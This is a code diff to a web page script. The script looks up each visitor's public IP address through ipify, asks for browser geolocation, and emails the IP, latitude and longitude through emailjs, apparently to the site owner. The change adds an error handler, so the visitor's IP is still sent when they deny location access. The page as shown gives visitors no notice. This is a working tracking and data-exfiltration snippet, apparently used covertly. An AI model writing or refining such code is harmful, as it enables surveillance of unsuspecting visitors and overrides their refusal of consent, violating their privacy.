@@ -47,8 +47,8 @@
         // Format the message to include the IP address, latitude, and longitude
         let message = `
                 IP Address: ${ip}
-                Latitude: ${lat}
-                Longitude: ${long}
+                Latitude: ${lat !== undefined ? lat : "Not available"}
+                Longitude: ${long !== undefined ? long : "Not available"}
             `;
 
         emailjs
@@ -67,13 +67,22 @@
         $.getJSON("https://api.ipify.org?format=json", function (data) {
           let ip = data.ip;
 
-          navigator.geolocation.getCurrentPosition((position) => {
-            let lat = position.coords.latitude;
-            let long = position.coords.longitude;
 
-            // Send the formatted message via email
-            sendEmail(ip, lat, long);
-          });
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              let lat = position.coords.latitude;
+              let long = position.coords.longitude;
+              console.log("Retrieved Position:", lat, long);
+
+              // Send the data via email
+              sendEmail(ip, lat, long);
+            },
+            (error) => {
+              // Handle location access error
+              console.error("Error getting geolocation:", error);
+              sendEmail(ip); // Send email with IP only
+            }
+          );
         });
       });
     </script>
